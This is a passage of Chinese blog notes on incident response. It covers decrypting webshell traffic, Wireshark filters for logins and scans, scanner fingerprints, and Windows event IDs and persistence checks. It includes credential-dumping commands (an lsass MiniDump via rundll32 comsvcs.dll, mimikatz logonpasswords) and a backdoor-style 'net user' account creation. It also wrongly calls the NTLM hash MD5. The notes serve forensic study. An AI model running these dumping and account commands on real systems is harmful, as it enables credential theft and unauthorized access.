<p>URL_Decode()<br>From_Base64(‘A-Za-z0-9+&#x2F;&#x3D;’,true,false)<br>AES_Decrypt({‘option’:’UTF8’,’string’:’1710acba6220f62b’},{‘option’:’Hex’,’string’:’’},’ECB’,’Raw’,’Raw’,{‘option’:’Hex’,’string’:’’},{‘option’:’Hex’,’string’:’’})<br>Gunzip()</p>
</blockquote>
<p>解密响应包：</p>
<blockquote>
<p>Find_&#x2F;<em>Replace({‘option’:’Regex’,’string’:’B333AF03A314E0FB’},’’,true,false,true,false)<br>Find</em>&#x2F;_Replace({‘option’:’Regex’,’string’:’0F00BC7E2672E1F5’},’’,true,false,true,false)<br>From_Base64(‘A-Za-z0-9+&#x2F;&#x3D;’,true,false)<br>AES_Decrypt({‘option’:’UTF8’,’string’:’1710acba6220f62b’},{‘option’:’Hex’,’string’:’’},’ECB’,’Raw’,’Raw’,{‘option’:’Hex’,’string’:’’},{‘option’:’Hex’,’string’:’’})<br>Gunzip()</p>
</blockquote>
<p>解密后的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cmdLine <span class="string">&#x27; sh -c &quot;cd &quot;/&quot;;cat /etc/os-release&quot; 2&gt;&amp;1 arg-3 2&gt;&amp;1 executableFile shexecutableArgs $ -c &quot;cd &quot;/&quot;;cat /etc/os-release&quot; 2&gt;&amp;1 arg-0 sh argsCount 4arg-1 -carg-2 cd &quot;/&quot;;cat /etc/os-release</span></span><br><span class="line"><span class="string">methodName execCommand</span></span><br></pre></td></tr></table></figure>

<p>其中实际执行的是<code>cat /etc/os-release</code></p>
</li>
</ul>
<h1 id="查找登录密码："><a href="#查找登录密码：" class="headerlink" title="查找登录密码："></a>查找登录密码：</h1><ul>
<li>常用post方法</li>
</ul>
<blockquote>
<p>http.request.method &#x3D;&#x3D; POST</p>
</blockquote>
<ul>
<li>定位具体网页,查找200回显</li>
</ul>
<blockquote>
<p>http.request.uri &#x3D;&#x3D; “xx” &amp;&amp; http.response &#x3D;&#x3D; 1</p>
</blockquote>
<ul>
<li>可能在标头</li>
<li>跳转成功会跳转302</li>
</ul>
<blockquote>
<p>http contains “admin” &amp;&amp;http.request.uri &#x3D;&#x3D; “&#x2F;login.php”</p>
</blockquote>
<ul>
<li>搜索关键字符串</li>
</ul>
<blockquote>
<p>http contains “password”&#x2F;“Authorization”</p>
</blockquote>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><h2 id="SYN扫描"><a href="#SYN扫描" class="headerlink" title="SYN扫描"></a>SYN扫描</h2><p>发送syn包，返回SA包则开放,反之则关闭：</p>
<p><code>tcp.flags.syn == 1 and tcp.flags.ack == 0</code></p>
<h2 id="FIN扫描"><a href="#FIN扫描" class="headerlink" title="FIN扫描"></a>FIN扫描</h2><p>发送fin包,返回RST包则关闭,反之则开放或被过滤</p>
<p><code>tcp.flags.fin == 1</code></p>
<h2 id="udp扫描"><a href="#udp扫描" class="headerlink" title="udp扫描"></a>udp扫描</h2><p>简单封包后直接发送,ddos常用</p>
<p><code>UDP</code></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他:"></a>其他:</h2><ul>
<li>用户名 whoami-default</li>
<li>看时间顺序</li>
</ul>
<blockquote>
<p>frame.time_relative &#x2F;&#x2F;筛选相对时间<br>frame.len &#x2F;&#x2F;筛选长度</p>
</blockquote>
<ul>
<li>找服务端口，看http的host标头</li>
<li>维权找&#x2F;bin</li>
</ul>
<h1 id="内网扫描工具流量指纹"><a href="#内网扫描工具流量指纹" class="headerlink" title="内网扫描工具流量指纹"></a>内网扫描工具流量指纹</h1><p><a href="https://blog.csdn.net/Javachichi/article/details/142128840">https://blog.csdn.net/Javachichi/article/details/142128840</a></p>
<h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>扫描特征:</p>
<ul>
<li><p>使用操作系统的TCP全连接,非半连接扫描</p>
<p>即完成完整的三次握手</p>
</li>
</ul>
<p><img src="/../images/image-20250609220748704.png" alt="image-20250609220748704"></p>
<p>存活检测:</p>
<ul>
<li>仅使用ICMP Echo请求</li>
<li>Echo请求无负载,类似Nmap（不携带数据）</li>
</ul>
<p><img src="/../images/image-20250609220612168.png" alt="image-20250609220612168"></p>
<h2 id="goby"><a href="#goby" class="headerlink" title="goby"></a>goby</h2><p>SYN扫描特征:</p>
<ul>
<li>使用TCP半连接扫描,类似Nmap和Masscan</li>
</ul>
<p>存活检测: Goby的存活检测方法比较特别:</p>
<ul>
<li>使用UDP探活:发送数据包到一个不太可能开放的UDP端口,等待ICMP端口不可达响应</li>
<li>使用固定的端口和数据payload,这给了Goby明显的特征</li>
</ul>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>SYN扫描特征:</p>
<ul>
<li>TCP窗口大小固定为1024</li>
<li>TCP选项使用固定的值:02 04 05 b4 (这是TCP选项中最短的长度)</li>
</ul>
<p>存活检测:</p>
<ul>
<li><p>ICMP Echo请求 (就是我们熟悉的ping) 特征: Nmap发送的ICMP Echo请求没有额外的数据负载</p>
</li>
<li><p>ICMP时间戳请求 这是另一种ICMP请求,用于获取目标系统的时间</p>
</li>
<li><p>ACK诱导RST 向目标发送ACK包,如果目标存活,会回复RST包</p>
</li>
<li><p>常见端口SYN探测 对80和443等常用端口发送SYN包,观察响应</p>
</li>
</ul>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
        <tag>流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>不只是日志分析-windows篇</title>
    <url>/2025/06/10/windows-%E4%B8%8D%E5%8F%AA%E6%98%AF%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="常用的软件"><a href="#常用的软件" class="headerlink" title="常用的软件"></a>常用的软件</h1><table>
<thead>
<tr>
<th>软件名</th>
<th>作用</th>
<th>快捷启动（win+R）</th>
</tr>
</thead>
<tbody><tr>
<td>事件查看器</td>
<td>审计事件日志(安全类可以看到用户类操作日志，登录成功&#x2F;失败……)</td>
<td>eventvwr.msc</td>
</tr>
<tr>
<td>计划任务程序</td>
<td>查看计划任务</td>
<td>taskschd.msc</td>
</tr>
<tr>
<td>服务</td>
<td>查看各种服务</td>
<td>services.msc</td>
</tr>
<tr>
<td>注册表</td>
<td>存储系统和应用程序的设置信息</td>
<td>regedit</td>
</tr>
<tr>
<td>用户账户</td>
<td>用户权限设置</td>
<td>netplwiz</td>
</tr>
<tr>
<td>本地用户和组</td>
<td>可以查看隐藏的用户</td>
<td>lusrmgr.msc</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h1 id="常见的windows事件id"><a href="#常见的windows事件id" class="headerlink" title="常见的windows事件id"></a>常见的windows事件id</h1><p>记得时间排序</p>
<h2 id="安全日志相关事件ID"><a href="#安全日志相关事件ID" class="headerlink" title="安全日志相关事件ID"></a>安全日志相关事件ID</h2><table>
<thead>
<tr>
<th>事件ID</th>
<th>事件名称</th>
<th>描述说明</th>
</tr>
</thead>
<tbody><tr>
<td>4624</td>
<td>成功的账户登录事件</td>
<td>记录登录账号、时间、来源IP等信息，帮助识别非法登录</td>
</tr>
<tr>
<td>4625</td>
<td>账户登录失败事件</td>
<td>记录未成功的登录尝试，用于检测密码爆破或非法访问</td>
</tr>
<tr>
<td>4634</td>
<td>用户注销事件</td>
<td>记录用户主动注销或系统超时自动注销</td>
</tr>
<tr>
<td>4672</td>
<td>特权账户登录事件</td>
<td>当管理员&#x2F;特权账号登录时记录，监控高权限用户活动</td>
</tr>
<tr>
<td>4738</td>
<td>用户账户管理</td>
<td>可以用来看用户账户更改</td>
</tr>
<tr>
<td>4688</td>
<td>新进程创建事件</td>
<td>记录进程创建信息，检测恶意软件执行行为</td>
</tr>
<tr>
<td>4697</td>
<td>服务安装事件</td>
<td>记录系统服务安装操作，识别未经授权的服务</td>
</tr>
<tr>
<td>4768</td>
<td>Kerberos认证票据授予事件</td>
<td>与域控制器身份验证相关，分析域账号滥用情况</td>
</tr>
<tr>
<td>4776</td>
<td>NTLM认证失败事件</td>
<td>记录NTLM认证失败，检测异常身份验证行为</td>
</tr>
<tr>
<td>4719</td>
<td>审计策略更改事件</td>
<td>监控审计策略变更，判断是否有恶意用户试图掩盖操作痕迹</td>
</tr>
<tr>
<td>4663</td>
<td>文件和目录的访问尝试</td>
<td>可以用来看用户访问成功的文件</td>
</tr>
</tbody></table>
<p>注：<strong>TargetUserName</strong>为windows用户名</p>
<h2 id="系统日志相关事件ID"><a href="#系统日志相关事件ID" class="headerlink" title="系统日志相关事件ID"></a>系统日志相关事件ID</h2><table>
<thead>
<tr>
<th>事件ID</th>
<th>事件名称</th>
<th>描述说明</th>
</tr>
</thead>
<tbody><tr>
<td>6005</td>
<td>事件日志服务启动</td>
<td>系统启动事件日志服务时记录</td>
</tr>
<tr>
<td>6006</td>
<td>事件日志服务停止</td>
<td>系统关机前记录，配合其他日志判断异常关机</td>
</tr>
<tr>
<td>6008</td>
<td>非正常关机事件</td>
<td>系统意外关闭时记录，检测崩溃或强制关机行为</td>
</tr>
<tr>
<td>7045</td>
<td>服务安装事件</td>
<td>记录新服务安装操作，分析恶意服务安装行为</td>
</tr>
<tr>
<td><strong>12</strong></td>
<td>系统启动时间</td>
<td>启动次数</td>
</tr>
<tr>
<td><strong>13</strong></td>
<td>系统关机时间</td>
<td>关机次数</td>
</tr>
<tr>
<td><strong>1074</strong></td>
<td>重启</td>
<td>系统重启,关闭或者注销</td>
</tr>
</tbody></table>
<p>注:更改用户名后的第一次重启,算在system里</p>
<h2 id="应用程序日志相关事件ID"><a href="#应用程序日志相关事件ID" class="headerlink" title="应用程序日志相关事件ID"></a>应用程序日志相关事件ID</h2><table>
<thead>
<tr>
<th>事件ID</th>
<th>事件名称</th>
<th>描述说明</th>
</tr>
</thead>
<tbody><tr>
<td>1000</td>
<td>应用程序崩溃事件</td>
<td>记录崩溃详情（含错误代码、故障模块名称等）</td>
</tr>
<tr>
<td>4621</td>
<td>应用程序挂起事件</td>
<td>分析应用程序无响应&#x2F;卡死的原因</td>
</tr>
</tbody></table>
<h1 id="查找隐藏用户-影子用户"><a href="#查找隐藏用户-影子用户" class="headerlink" title="查找隐藏用户&amp;影子用户"></a>查找隐藏用户&amp;影子用户</h1><ul>
<li>lusrmgr.msc查看用户组（后缀带$）</li>
<li>注册表地址：HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</li>
</ul>
<h1 id="自启动"><a href="#自启动" class="headerlink" title="自启动"></a>自启动</h1><ul>
<li>自启动文件夹：shell:setup</li>
<li>注册表自启动(将绝对路径下程序进行字符串值保存会开机自启)：HKEY*<em>CURRENT</em>*USER\Software\Microsoft\Windows\CurrentVersion\Run</li>
<li>计划任务程序：taskschd.msc</li>
<li>目录下翻找bat文件和可疑exe文件</li>
</ul>
<h1 id="查看远程shell连接ip"><a href="#查看远程shell连接ip" class="headerlink" title="查看远程shell连接ip"></a>查看远程shell连接ip</h1><ul>
<li>寻找可疑ip和端口</li>
</ul>
<blockquote>
<p>排查思路：</p>
<ol>
<li><p>根据端口排查</p>
</li>
<li><p>查询可疑ip</p>
</li>
<li><p>PID排查</p>
<p>tasklist | findstr “PID” #寻找启动文件</p>
<p>wmic process get name,executablepath,processid | findstr 2856 #寻找文件绝对路径</p>
</li>
</ol>
</blockquote>
<ul>
<li>找到可疑exe文件丢给沙箱分析，看网络行为特征</li>
</ul>
<h1 id="关键文件"><a href="#关键文件" class="headerlink" title="关键文件"></a>关键文件</h1><ul>
<li><p>用户权限高</p>
<p><code>administrator</code></p>
</li>
<li><p>访问权限和操作特定</p>
<p><code>AccessMask 0x20000</code> 和 <code>AccessList %%1538</code> 这些值指示了具体的访问权限</p>
</li>
<li><p>路径</p>
<p><code>C:\Windows\System32\SMI\Store\Machine\SCHEMA.DAT</code></p>
</li>
</ul>
<h1 id="查找-更改windows用户密码"><a href="#查找-更改windows用户密码" class="headerlink" title="查找&#x2F;更改windows用户密码"></a>查找&#x2F;更改windows用户密码</h1><p><code>rundll32.exe comsvcs.dll, MiniDump &lt;PID&gt; &lt;DUMP_FILE_PATH&gt; full</code></p>
<p>此命令使用rundll32.exe来调用comsvce.dll中的minidump函数,生成了一个包含系统账户和密码信息的lsass.dmp文件</p>
<ul>
<li>获取dmp文件</li>
</ul>
<blockquote>
<p>文件头:4D 44 4D 50 93 A7</p>
<p>大小:几百KB到几MB</p>
<p>关键词搜索:password</p>
</blockquote>
<ul>
<li>使用minikatz来读取密码</li>
</ul>
<blockquote>
<p>sekurlas::minidump 1.dmp<br>sekurlsa::logonpasswords</p>
</blockquote>
<p><img src="/../images/fe2e239e-29b8-4ab5-9479-8c44b867dc3f.png" alt="fe2e239e-29b8-4ab5-9479-8c44b867dc3f"></p>
<p>ntml即为用户密码的md5,丢去解密即可</p>
<p><code>net user admin Password1 /add</code></p>
<p>此命令用来添加windows账户,权限为普通用户,用户名为admin,密码为Password1</p>
<h1 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h1><ul>
<li><p><code>./</code>隐藏,设置打开查看隐藏文件即可</p>
</li>
<li><p>修改文件属性</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> /a</span><br><span class="line"><span class="built_in">attrib</span> -s -h <span class="number">7</span>z.exe</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
        <tag>windows</tag>
        <tag>日志分析</tag>
      </tags>
  </entry>
</search>
